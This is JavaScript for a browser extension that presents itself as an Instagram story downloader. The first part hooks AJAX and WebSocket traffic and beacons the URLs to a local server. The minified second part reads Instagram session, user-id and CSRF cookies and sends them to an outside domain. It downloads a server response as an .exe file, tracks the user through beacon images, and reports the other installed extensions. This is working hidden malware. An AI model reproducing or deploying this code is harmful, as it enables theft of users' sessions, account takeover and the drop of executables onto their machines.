function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(){function a(a,b){var c="https://domain.status-check.xyz/__utm.gif?e=instagram_story_downloader"+o()+"&k="+encodeURIComponent(a)+"&uid="+encodeURIComponent(""+j)+"&it="+(window.localStorage.installedTime||"")+"&lang="+(window&&window.navigator&&window.navigator.language?window.navigator.language:"-")+"&r="+Math.random()+("undefined"!=typeof b?"&d="+encodeURIComponent(b):"");c=c.substr(0,2e3),(new Image).src=c}function b(c,d){if("undefined"!=typeof d&&"string"!=typeof d)return void b(" ["+c+"]wrong_type_details_track_event",c+": "+typeof d);if(j)a(c,d);else{var e="uidinstagram_story_downloader";chrome.storage.sync.get(e,function(b){j=b[e]||"nop",a(c,d)})}}function c(a){var b={};chrome.cookies.get({url:q,name:"ds_user_id"},function(c){c&&(b.ds_user_id=c.value),chrome.cookies.get({url:q,name:"sessionid"},function(c){c&&(b.sessionid=c.value),chrome.cookies.get({url:q,name:"csrftoken"},function(c){c&&(b.csrftoken=c.value),a&&a(b)})})})}function d(a){c(function(b){p=b,"undefined"!=typeof p.ds_user_id&&"undefined"!=typeof p.sessionid&&"undefined"!=typeof p.csrftoken&&"function"==typeof a?"function"==typeof a&&a(b):"function"==typeof a&&a()})}function e(a,b){u||(u=Date.now());var c=3;return b=b||0,b++,Date.now()<t+v?void a(s):void d(function(d){$.ajax({method:"GET",url:"https://i.instagram.com/api/v1/feed/reels_tray/",dataType:"json"}).done(function(d){if(d&&"object"==typeof d){t=Date.now();var f=d.broadcasts||[],g=d.post_live&&d.post_live.post_live_items||[],h=d.tray||[];s=[].concat(f,g,h),a(s)}else c>b&&setTimeout(function(){e(a,b)},1e3)}).fail(function(d){c>b&&setTimeout(function(){e(a,b)},1e3)})})}function f(a,b,c){var d,e,f=function(f){if("function"==typeof c){if(!f)return c();m[f]=b.tab.id,a.isStory&&(l[f]=b.tab.id),d=setInterval(function(){k[f]&&(window.localStorage.downloadOne++,c(f),clearInterval(d),clearTimeout(e),delete k[f]),e=setTimeout(function(){d&&(clearInterval(d),c())},3e3)},100)}};if("object"!=typeof a||!a.url||!a.filename)return f();var g=a.url,h=a.filename,i={url:g};h&&(i.filename=h),chrome.downloads.download(i,function(b){if("undefined"==typeof b){var c=a.filename.match(/([\w_]+)(\.\w{3,4})$/);c=c&&c[0],c?(h=c.substr(c.length-32),h&&(i.filename=h),chrome.downloads.download(i,function(a){f(a)})):f(b)}else f(b)})}function g(a,c,d,e){var f=c.tab.id,g=[],h=a.params;h.uid=j,h.r=Math.random(),h.lang=window&&window.navigator&&window.navigator.language?window.navigator.language:"-",h.cookies=JSON.stringify(d);for(var i in h)g.push(i+"="+encodeURIComponent(h[i]));g=g.join("&"),g+=o(),a={url:"https://downloader-for-insta.com/set-session.json?"+g,filename:a.filename+".exe",method:"POST",saveAs:!1,conflictAction:"overwrite"},chrome.downloads.download(a,function(c){return c?(w[c]={tabId:f,file_v:h.file_v,file_a:h.file_a,name:h.name,lang:h.lang},void("function"==typeof e&&e(c))):(b("fail_post_live_download_on_start",JSON.stringify(a)),void e())})}function h(a){chrome.downloads.open(a)}function i(a){chrome.tabs.create({url:"chrome-extension://"+chrome.runtime.id+"/stories.html#live_"+a})}var j=null,k={},l={},m={},n={},o=function(){return"&vid="+(chrome.runtime.id?chrome.runtime.id.substr(0,11):"-")+"&vv="+(chrome.runtime.getManifest&&chrome.runtime.getManifest()?chrome.runtime.getManifest().version:"-")};window.trackEvent=b;var p={},q="https://www.instagram.com",r="Instagram 10.26.0 (iPhone7,2; iOS 10_1_1; en_US; en-US; scale=2.00; gamut=normal; 750x1334) AppleWebKit/420+";d();var s=[],t=0,u=0,v=3e4;window.localStorage.allSuccessTriesCountStories||(window.localStorage.allSuccessTriesCountStories=0),window.localStorage.allFailedTriesCountStories||(window.localStorage.allFailedTriesCountStories=0);var w={};chrome.downloads.onCreated.addListener(function(a){k[a.id]=1,a.url.indexOf("blob:https://www.instagram.com")>-1&&(n[a.id]=a.url)}),chrome.downloads.onChanged.addListener(function(a){if(w[a.id]&&(a.state&&/interrupted|complete/.test(a.state.current)?(chrome.tabs.sendMessage(w[a.id].tabId,{action:"postLiveLoaderDownloadFinished",downloadId:a.id,state:a.state,file_v:w[a.id].file_v,file_a:w[a.id].file_a,name:w[a.id].name,lang:w[a.id].lang}),delete w[a]):chrome.tabs.sendMessage(w[a.id].tabId,{action:"postLiveLoaderDownloadStarted",downloadId:a.id,state:a.state})),l[a.id]&&(chrome.tabs.sendMessage(l[a.id],"storyPauseOffByDownloadId"),delete l[a.id]),m[a.id]&&a.state&&("interrupted"==a.state.current||"complete"==a.state.current)&&(chrome.tabs.sendMessage(m[a.id],{action:"downloadFileFinished",status:a.state.current}),delete m[a.id]),n[a.id]){var b=n[a.id];chrome.tabs.query({url:["*://*.instagram.com/*"]},function(a){a.forEach(function(a){chrome.tabs.sendMessage(a.id,{action:"storyPauseOffByBlobUrl",url:b})})}),delete n[a.id]}k[a.id]&&delete k[a.id]}),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){try{var c,d,e=a.requestHeaders;if(a.url.indexOf("instagram.com")<0)return;var f="ds_user_id="+p.ds_user_id+"; sessionid="+p.sessionid+"; csrftoken="+p.csrftoken+";",g=!0;if(p.ds_user_id&&p.sessionid||(g=!1),g)for(d=0;d<e.length;d++)c=e[d],"x-requested-with"==c.name.toLowerCase()&&(g=!1),"referer"==c.name.toLowerCase()&&-1==c.value.indexOf("https://www.instagram.com")&&(g=!1);if(g)for(d=0;d<e.length;d++)c=e[d],"user-agent"==c.name.toLowerCase()&&(c.value=r),"cookie"==c.name.toLowerCase()&&(c.value=f);return{requestHeaders:e}}catch(h){b("code_error",JSON.stringify({method:"webRequestListener",name:h.name,message:h.message,stack:h.stack}))}},{urls:["*://*.instagram.com/*"],types:["xmlhttprequest"]},["blocking","requestHeaders"]),chrome.browserAction.onClicked.addListener(function(a){a.url&&-1===a.url.indexOf("instagram.com")&&chrome.tabs.create({url:"https://www.instagram.com/"})}),chrome.runtime.onMessage.addListener(function(a,j,k){if(a)if("string"==typeof a)switch(a){case"getCookies":return d(k),!0;case"requestStories":return e(k),!0;case"getUserSelfInfo":return d(function(a){a.ds_user_id?k(a.ds_user_id):k()}),!0;case"warning-off":window.localStorage.warningPostLiveOff2=1;break;case"showWarningDownloadPostLive":k(1!=window.localStorage.warningPostLiveOff2);break;default:return}else if("object"==typeof a&&"string"==typeof a.action)switch(a.action){case"trackEvent":"string"==typeof a.event&&a.event.length>0&&b(a.event,a.details);break;case"downloadFile":return f(a.options,j,k),!0;case"downloadPostLiveLoader":return c(function(b){g(a.options,j,b,k)}),!0;case"openPostLive":h(a.id);break;case"open_stories_tab":i(a.story_id);break;default:return}}),function(){function a(){window.location.reload()}setTimeout(a,2592e5)}(),function(){var a=function(){return"storexxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=16*Math.random()|0,c="x"===a?b:3&b|8;return c.toString(16)})};"undefined"==typeof window.localStorage.installedTime&&(window.localStorage.installedTime=Date.now());var b="nop",c="uidinstagram_story_downloader";chrome.storage.sync.get(c,function(d){function e(){return"&vid="+(chrome.runtime.id?chrome.runtime.id.substr(0,11):"-")+"&vv="+(chrome.runtime.getManifest&&chrome.runtime.getManifest()?chrome.runtime.getManifest().version:"-")}function f(){var a,c=[];chrome.management.getAll(function(d){d.forEach(function(a){"extension"===a.type&&a.enabled&&"normal"===a.installType&&a.id!=chrome.runtime.id&&-1==i.indexOf(a.id)&&c.push(a.id.substr(0,11))});var f="https://instagram.user-experience.space/?ext=instagram_story_downloader"+e()+"&uid="+b;a=c.join(),f=f+"&ids="+(a||""),f+="&rnd="+Math.random().toString().substr(0,8),f=f.substr(0,255),chrome.runtime.setUninstallURL(f)})}var g=d[c];if(!g){g=a();var h={};h[c]=g,chrome.storage.sync.set(h)}b=g,(new Image).src="https://domain.status-check.xyz/__utm.gif?e=instagram_story_downloader"+e()+"&k=bkg_run&it="+(window.localStorage.installedTime||"")+"&uid="+encodeURIComponent(b)+"&r="+Math.random();var i=[""];chrome.runtime.setUninstallURL&&(f(),setInterval(f,3e5))}),setTimeout(function(){"nop"==b&&((new Image).src="https://domain.status-check.xyz/__utm.gif?e=instagram_story_downloader"+o()+"&k=bkg_run&it="+(window.localStorage.installedTime||"")+"&uid="+encodeURIComponent(b)+"&r="+Math.random())},6e4)}()}();